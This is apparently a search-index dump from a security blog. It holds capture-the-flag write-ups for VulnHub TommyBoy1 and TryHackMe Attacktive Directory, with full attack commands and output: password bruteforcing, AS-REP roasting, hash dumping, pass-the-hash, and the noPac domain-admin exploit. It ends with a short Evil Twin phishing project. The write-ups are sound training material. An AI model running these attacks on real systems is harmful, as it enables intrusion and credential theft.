ce154b5a8e59c89732bc25d6a2e6b90b Looks like a hash Crack hash w/ hashcat ┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/loot/http]└─# hashcat -a 0 -m 0 &quot;ce154b5a8e59c89732bc25d6a2e6b90b&quot; /usr/share/wordlists/rockyou.txt --showce154b5a8e59c89732bc25d6a2e6b90b:spanky spanky Proceed to the password-locked post Useful Information A backup file called callahanbak.bak (FTP) Server that goes online for 15 minutes then down for 15 minutes A user called nickburns whose password is easy to guess Do an NMAP Scan again PORT STATE SERVICE22/tcp open ssh80/tcp open http8008/tcp open http65534/tcp open unknown 65534 wasn’t up in the initial scan, it is likely the FTP Server Bruteforce ┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/exploit/bruteforce]└─# hydra -l nickburns -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ftp://$ip -s 65534 -e nsr [DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task[DATA] attacking ftp://192.168.56.129:65534/[65534][ftp] host: 192.168.56.129 login: nickburns password: nickburns1 of 1 target successfully completed, 1 valid password found nickburns:nickburns TCP/65534 (FTP) Access FTP w/ nickburns:nickburns, check for write access ┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/loot/ftp] └─# ftp -nv $ip 65534 Connected to 192.168.56.129. 220 Callahan_FTP_Server 1.3.5 ftp&amp;gt; user nickburns 331 Password required for nickburns Password: 230 User nickburns logged in Remote system type is UNIX. Using binary mode to transfer files. ftp&amp;gt; put test local: test remote: test 200 PORT command successful 150 Opening BINARY mode data connection for test 226 Transfer complete ftp&amp;gt; dir 200 PORT command successful 150 Opening ASCII mode data connection for file list -rw-rw-r-- 1 nickburns nickburns 977 Jul 15 2016 readme.txt -rw-r--r-- 1 nickburns nickburns 0 Jan 18 08:10 test 226 Transfer complete ftp&amp;gt; We have write access Download all files ┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/loot/ftp] └─# wget -m --no-passive ftp://nickburns:nickburns@$ip:65534 --2022-01-18 16:44:57-- ftp://nickburns:*password*@192.168.56.129:65534/ =&amp;gt; ‘192.168.56.129:65534/.listing’ Connecting to 192.168.56.129:65534... connected. Logging in as nickburns ... Logged in! View readme.txt Useful Information NickIzL33t directory “look at on your phone later” suggests that its a web directory Fuzz web directoryTCP/8008 (HTTP) - Generate Wordlist + Password Cracking Proceed to index.html Was stuck here for a long time, Steve Job is a hint to switch user-agent to iphone. Switch User-Agent to iphone We have to FUZZ for .html file Fuzz it ┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/loot/ftp/192.168.56.129:65534] └─# ffuf -fw 29 -H &quot;User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1&quot; -u http://192.168.56.129:8008/NickIzL33t/FUZZ -w /usr/share/wordlists/rockyou.txt -e &quot;.html&quot; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.56.129:8008/NickIzL33t/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/rockyou.txt :: Header : User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 :: Extensions : .html :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 29 ________________________________________________ fallon1.html [Status: 200, Size: 459, Words: 56, Lines: 13] Found fallon1.html Proceed to fallon1.html Proceed to directories found in fallon1.html hint.txt flagtres.txt (Flag 3) Big Tom’s encrypted pw backups Password encrypted zip file Cracking Zip File Password Requirements bev One uppercase character Two numbers Two lowercase character One symbol 1995 Create password generator python script #!/usr/bin/python #https://docs.python.org/3/library/string.html from string import ascii_uppercase from string import ascii_lowercase from string import punctuation for a in ascii_uppercase: for b in range(0, 10): for c in range (0, 10): for d in ascii_lowercase: for e in ascii_lowercase: for f in punctuation: print(&quot;bev&quot; + str(a) + str(b) + str(c) + str(d) + str(e) + str(f) + &quot;1995&quot;) Generate password word list. python passwordgen.py &amp;gt; passwords.txt Download zip wget http://192.168.56.129:8008/NickIzL33t/t0msp4ssw0rdz.zip --header=&quot;User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1&quot; Crack zip ┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/exploit/bruteforce] └─# fcrackzip -v -u -D -p passwords.txt t0msp4ssw0rdz.zip found file &#39;passwords.txt&#39;, (size cp/uc 332/ 641, flags 9, chk 9aad) checking pw bevG93kv~1995 PASSWORD FOUND!!!!: pw == bevH00tr$1995 Unzip &amp;amp; view contents Wordpress Draft contains last 4 digit of password Stuck here again, famous Queen song has too many possiblities &amp;amp; the password could be the lyrics as well. TCP/80 (HTTP) - Wordpress (Bruteforce) Bruteforce against tom’s account (tommy, tom) w/ rockyou.txt wpscan --no-update --disable-tls-checks --wp-content-dir wp-admin --url http://tommyboy/prehistoricforest/ --usernames usernames.txt --passwords /usr/share/wordlists/rockyou.txt -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/TommyBoy1/192.168.56.129/scans/tcp80/tcp_80_http_wpscan_bruteforce.txt&quot; [+] Performing password attack on Wp Login against 2 user/s Progress: |== | [SUCCESS] - tom / tomtom1 Login w/ tom:tomtom1 &amp;amp; find draft fatguyinalittlecoat1938!! TCP/22 (SSH) SSH w/ found creds Obtain 4th flag Hint /5.txt Privilege Escalationwww-data Find 5.txt bigtommysenior@CallahanAutoSrv01:/tmp$ find / 2&amp;gt;/dev/null | grep -i 5.txt /lib/firmware/ath10k/QCA6174/hw2.1/notice_ath10k_firmware-5.txt /lib/firmware/ath10k/QCA988X/hw2.0/notice_ath10k_firmware-5.txt /lib/firmware/ath10k/QCA99X0/hw2.0/notice_ath10k_firmware-5.txt /.5.txt # &amp;lt;-this Check /.5.txt permissions bigtommysenior@CallahanAutoSrv01:~$ ls -l /.5.txt -rwxr-x--- 1 www-data www-data 520 Jul 7 2016 /.5.txt Obtain creds from wp-config.php wordpressuser:CaptainLimpWrist!!! Replace wordpress admin user (richard) password w/ tom’s # First user in the database is usually the admin UPDATE wp_users SET user_pass = &#39;$P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK.&#39; WHERE ID = 1; mysql&amp;gt; UPDATE wp_users -&amp;gt; SET user_pass = &#39;$P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK.&#39; -&amp;gt; WHERE ID = 1; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 richard:tomtom1 Login w/ richard:tomtom1, upload reverse shell Execute reverse shell at prehistoricforest/wp-content/themes/twentysixteen/404.php www-data shell obtained Obtain 5th flag Compile the flags ┌──(root💀kali)-[~/vulnHub/TommyBoy1] └─# python3 Python 3.9.9 (main, Dec 16 2021, 23:13:29) [GCC 11.2.0] on linux Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &amp;gt;&amp;gt;&amp;gt; print (&quot;B34rcl4ws&quot; + &quot;Z4l1nsky&quot; + &quot;TinyHead&quot; + &quot;EditButton&quot; + &quot;Buttcrack&quot;) B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack &amp;gt;&amp;gt;&amp;gt; Obtain final flag" }, { "title": "TryHackMe - Attacktive Directory", "url": "/posts/Attacktive-Directory/", "categories": "TryHackMe, Active Directory", "tags": "ad/kerbrute/user-enum, ad/as-rep-roasting, ad/kerbrute/password-spray, ad/kerberoasting, tcp/139-445-smb/fileshare, ad/bloodhound, ad/evil-winrm, ad/secretsdump", "date": "2022-01-09 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Sun Jan 9 21:22:43 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/tryhackme/attacktivedirect/10.10.184.179/scans/_full_tcp_nmap.txt -oX /root/tryhackme/attacktivedirect/10.10.184.179/scans/xml/_full_tcp_nmap.xml 10.10.184.179adjust_timeouts2: packet supposedly had rtt of -198855 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -198855 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -199486 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -199486 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -199952 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -199952 microseconds. Ignoring time.Nmap scan report for 10.10.184.179Host is up, received user-set (0.30s latency).Scanned at 2022-01-09 21:22:44 +08 for 771sNot shown: 65509 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 127 Simple DNS Plus80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-01-09 13:33:24Z)135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds? syn-ack ttl 127464/tcp open kpasswd5? syn-ack ttl 127593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped syn-ack ttl 1273268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped syn-ack ttl 1273389/tcp open ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services|_ssl-date: 2022-01-09T13:35:26+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local| Issuer: commonName=AttacktiveDirectory.spookysec.local| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2022-01-08T13:22:27| Not valid after: 2022-07-10T13:22:27| MD5: 7932 0bff f770 4fae e0c9 5c3b 55c7 f926| SHA-1: 4ce0 2690 8a98 dfd1 3e31 3dfe b693 7eb6 3724 21d2| -----BEGIN CERTIFICATE-----| MIIDCjCCAfKgAwIBAgIQQQpoi70iW4FFKxKDkM1g7DANBgkqhkiG9w0BAQsFADAu| MSwwKgYDVQQDEyNBdHRhY2t0aXZlRGlyZWN0b3J5LnNwb29reXNlYy5sb2NhbDAe| Fw0yMjAxMDgxMzIyMjdaFw0yMjA3MTAxMzIyMjdaMC4xLDAqBgNVBAMTI0F0dGFj| a3RpdmVEaXJlY3Rvcnkuc3Bvb2t5c2VjLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEF| AAOCAQ8AMIIBCgKCAQEAsyCckYH4HEU2s2Y3860Fw7z4YzVlyifMTDlZGTgWSAPG| dRroXK+8etUETfB55Y4jLS2xjqkoJ90zuOfDJw5dsaK/HQk2WqwLxPgEa+swO2iQ| TanHUjeCghBTbvuvia3JedAPVTH47W3/XOVD12zwBZSam668/UgEDBakYobjv6p/| g8qyRjMGz/SXkbT2E5Hbg/H438FzrEKgE0Zca1cvh6YpeDv7Z92WPepIkwUL91tm| uCDCryCL4ngULzxBCtXVpuO9oYi4qBAQ6Ry7Pl+fUVov1+TXEJKkOsPUgjtEUxuy| rvW6JIxAMqi6unaySb6HIVO3srqkLCJc5A7ydxCZiQIDAQABoyQwIjATBgNVHSUE| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABeQ| s/DzdcGVl9LSiQdlKvFIsop1IUl2TUFCAFsbxnumn/dIIWJ8BvNeDlHzGbgHUHTD| uXSmhW22GHszgwXc3+F7crX6Q+XgWnXH54O5M1a7JSBD/lf4h/65PLbqpmyeqbum| LnF6SXKU/fNRARpH3bReHSu2L7WIb4jfY3aEJl8vlSYibDP3yjfOujVv5CMg1UBB| RlwmU3upfJSSfSN23oxRM4+9AIhbkGlK4d3oCoQoROsknlNbBikdi44b5ZVjGBp+| TCzCKL+STZ4bffNrTfsYMMYs57V9JM7LnIlKYqEliB90emLZd8gzPJ8fjr1fu3lL| hA8fpkkca7brFq+ymlU=|_-----END CERTIFICATE-----| rdp-ntlm-info: | Target_Name: THM-AD| NetBIOS_Domain_Name: THM-AD| NetBIOS_Computer_Name: ATTACKTIVEDIREC| DNS_Domain_Name: spookysec.local| DNS_Computer_Name: AttacktiveDirectory.spookysec.local| DNS_Tree_Name: spookysec.local| Product_Version: 10.0.17763|_ System_Time: 2022-01-09T13:35:18+00:005985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.049664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC49672/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC49675/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.049676/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC49679/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC49683/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC49697/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPCOS fingerprint not ideal because: maxTimingRatio (1.660000e+00) is greater than 1.4Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows Vista SP1 (91%), Microsoft Windows 10 1709 - 1803 (90%), Microsoft Windows 10 1809 - 1909 (90%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows Server 2016 build 10586 - 14393 (90%)No exact OS matches for host (test conditions non-ideal).TCP/IP fingerprint:SCAN(V=7.92%E=4%D=1/9%OT=53%CT=1%CU=31926%PV=Y%DS=2%DC=T%G=N%TM=61DAE4A7%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10B%TS=U)SEQ(SP=106%GCD=1%ISR=107%CI=I%TS=U)OPS(O1=M505NW8NNS%O2=M505NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505NW8NNS%O6=M505NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M505NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)Network Distance: 2 hopsTCP Sequence Prediction: Difficulty=262 (Good luck!)IP ID Sequence Generation: Busy server or unknown classService Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-01-09T13:35:15|_ start_date: N/A| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 13605/tcp): CLEAN (Couldn&#39;t connect)| Check 2 (port 64743/tcp): CLEAN (Couldn&#39;t connect)| Check 3 (port 40958/udp): CLEAN (Failed to receive data)| Check 4 (port 61357/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked|_clock-skew: mean: 0s, deviation: 0s, median: 0s| smb2-security-mode: | 3.1.1: |_ Message signing enabled and requiredTRACEROUTE (using port 22/tcp)HOP RTT ADDRESS1 329.20 ms 10.11.0.12 329.25 ms 10.10.184.179Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Jan 9 21:35:35 2022 -- 1 IP address (1 host up) scanned in 773.53 secondsTCP/139,445 (SMB)Crackmapexeccrackmapexec smb $ipEnum4Linux Unable to enumerate any users. Domain Name AKA DNS Domain: spookysec.local FQDN: AttacktiveDirectory.spookysec.localInitial FootholdTCP/88 (Kerberos) Enumerate usernames w/ kerbrute ~/tools/windows-binaries/AD/kerbrute userenum --dc $ip -d spookysec.local userlist.txt -o found_users.txt Grep usernames, remove repeated words cat found_users.txt | cut -d &#39;:&#39; -f4 | cut -d &#39;@&#39; -f1 | cut -d &#39; &#39; -f2 | sort -u |uniq --ignore-case &amp;gt; found_users_grep.txt AS-REP Roasting w/ GetNPUsers.py GetNPUsers.py spookysec.local/ -usersfile found_users_grep.txt -dc-ip=$ip Out of all the enumerated users, only svc-admin has pre-auth disabled Crack hash hashcat -m 18200 AS-REP_hash.txt passwordlist.txt svc-admin:management2005 TCP/5985 (WinRM) Could not WINRM w/ svc-admin:management2005 ┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/scans] └─# crackmapexec winrm $ip -u &#39;svc-admin&#39; -p &#39;management2005&#39; SMB 10.10.15.180 5985 ATTACKTIVEDIREC [*] Windows 10.0 Build 17763 (name:ATTACKTIVEDIREC) (domain:spookysec.local) HTTP 10.10.15.180 5985 ATTACKTIVEDIREC [*] http://10.10.15.180:5985/wsman WINRM 10.10.15.180 5985 ATTACKTIVEDIREC [-] spookysec.local\\svc-admin:management2005 TCP/3389 (RDP) RDP w/ svc-admin:management2005 ┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/scans] └─# rdesktop -d spookysec.local -u &#39;svc-admin&#39; -p &#39;management2005&#39; $ip User Flag TryHackMe{K3rb3r0s_Pr3_4uth} Privilege EscalationBackup Password Spraying w/ kerbrute ~/tools/windows-binaries/AD/kerbrute passwordspray --dc $ip -d spookysec.local found_users_grep.txt management2005 -o password_spray_results.txt Password (management2005) not reused elsewhere Kerberoasting w/ GetUserSPNs.py GetUserSPNs.py spookysec.local/svc-admin:management2005 -dc-ip $ip -request Unable to find any SPN service accounts Access svc-admin fileshares smbmap -u &#39;svc-admin&#39; -p &#39;management2005&#39; -H $ip View backup directory smbclient //$ip/backup -U &#39;svc-admin&#39; Get all files recursively from backup directory smbclient //$ip/backup -U &#39;svc-admin&#39; -c &#39;prompt;recurse;mget *&#39; backup@spookysec.local:backup2517860 Domain Admin (a-spooks) - Secretsdump Look for privilege escalation path w/ bloodhound /usr/bin/neo4j start bloodhound-python -u backup -p backup2517860 -ns $ip -d spookysec.local -c All --zip # More complete syntax bloodhound-python -c All -u &#39;svc-admin&#39; -p &#39;management2005&#39; -gc &#39;ATTACKTIVEDIREC.spookysec.local&#39; -dc &#39;AttacktiveDirectory.spookysec.local&#39; -d &#39;spookysec.local&#39; -ns $ip --zip Both command works, use 1 only Bloodhound Analysis Setup Results: User backup@spookysec.local has GenericAll over the domain controller, allowing us to dump hashes on domain w/ secretsdump ┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/bloodhound] └─# impacket-secretsdump &#39;spookysec.local/backup@10.10.58.30&#39; -just-dc -outputfile secrets_dump_hash.txt Extract only NTLM hash cat secrets_dump_hash.txt.ntds | cut -d &#39;:&#39; -f4 Check if we can access SMB/WinRM w/ a-spooks:0e0363213e37b94221497260b0bcb4fc crackmapexec smb/winrm $ip -u &#39;a-spooks&#39; -H &#39;0e0363213e37b94221497260b0bcb4fc&#39; Access via evil-winrm to obtain flags evil-winrm -u &#39;a-spooks&#39; -H &#39;0e0363213e37b94221497260b0bcb4fc&#39; -i $ip Root Flag Domain Admin - CVE-2021-42278 &amp;amp; CVE-2021-42287 This exploit allows us to privilege escalate from any domain user to a domain administrator svc-admin -&amp;gt; Domain Admin Download exploit git clone https://github.com/Alh4zr3d/sam-the-admin.git Download scanner git clone https://github.com/Ridter/noPac.git Run scanner ┌──(root💀kali)-[~/tools/noPac] └─# python3 scanner.py spookysec.local/svc-admin:&#39;management2005&#39; -dc-ip $ip -use-ldap ███ ██ ██████ ██████ █████ ██████ ████ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██████ ███████ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ ██████ ██ ██ ██ ██████ [*] Current ms-DS-MachineAccountQuota = 10 [*] Got TGT with PAC from 10.10.58.30. Ticket size 1530 [*] Got TGT from AttacktiveDirectory.spookysec.local. Ticket size 733 Run the exploit ┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/sam-the-admin] └─# python3 sam_the_admin.py -dc-ip $ip spookysec.local/svc-admin:management2005 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [-] WARNING: Target host is not a DC [*] Selected Target attacktivedirectory.spookysec.local [*] Total Domain Admins 2 [*] will try to impersonate Administrator [*] Current ms-DS-MachineAccountQuota = 10 [*] Adding Computer Account &quot;CTHULHU-FHTAGN-38$&quot; [*] MachineAccount &quot;CTHULHU-FHTAGN-38$&quot; password = dRP0p0Q3gnM# [*] Successfully added machine account CTHULHU-FHTAGN-38$ with password dRP0p0Q3gnM#. [*] CTHULHU-FHTAGN-38$ object = CN=CTHULHU-FHTAGN-38,CN=Computers,DC=spookysec,DC=local [*] CTHULHU-FHTAGN-38$ sAMAccountName == attacktivedirec [*] Saving ticket in attacktivedirec.ccache [*] Resting the machine account to CTHULHU-FHTAGN-38$ [*] Restored CTHULHU-FHTAGN-38$ sAMAccountName to original value [*] Using TGT from cache [*] Impersonating Administrator [*] Requesting S4U2self [*] Saving ticket in Administrator.ccache [*] You can deploy a shell when you want using the following command: [$] KRB5CCNAME=&#39;Administrator.ccache&#39; /usr/bin/impacket-smbexec -target-ip 10.10.58.30 -dc-ip 10.10.58.30 -k -no-pass @&#39;attacktivedirectory.spookysec.local&#39; [*] Deleting Computer Account &quot;CTHULHU-FHTAGN-38$&quot; [*] MachineAccount &quot;CTHULHU-FHTAGN-38$&quot; password = dRP0p0Q3gnM# Kerberos auth requires DNS name of the target DC. Use -dc-host. Obtain a shell w/ smbexec ┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/sam-the-admin] └─# KRB5CCNAME=&#39;Administrator.ccache&#39; /usr/bin/impacket-smbexec -target-ip $ip -dc-ip $ip -k -no-pass @AttacktiveDirectory.spookysec.local Or dump hashes w/ secretsdump ┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/sam-the-admin] └─# KRB5CCNAME=&#39;Administrator.ccache&#39; /usr/bin/impacket-secretsdump -target-ip $ip -dc-ip $ip -k -no-pass @AttacktiveDirectory.spookysec.local Explanation of exploit https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html " }, { "title": "Evil-Twin", "url": "/posts/evil-twin/", "categories": "Projects, Raspberry Pi", "tags": "", "date": "2022-01-01 00:00:00 +0800", "snippet": "OverviewDuring my internship, I was given a raspberry pi to experiment with and was tasked to come up with something related to WiFi Pentesting. I wanted to find something that really intrigued me so began my research and found many interesting raspberry pi projects such as RubberDucky, Wi-Fi password cracking, hosting a phishing website, Evil Twin attacks. I decided to combine a few of the projects by creating an Evil-Twin access point with DNS poisoning that will redirect victims to a phishing website upon clicking a phishing website.Evil-TwinEvil Twin AP + DNS PoisoningWhat it does:When victim connects to the Evil AP, upon clicking the phishing link, victim will be redirected to the phishing site attacker is hosting.How to use:Usage: ./evil.sh &amp;lt;Evil AP Name&amp;gt; &amp;lt;specify interface wireless interface&amp;gt; &amp;lt;web server ip addr&amp;gt;Demo:" } ]
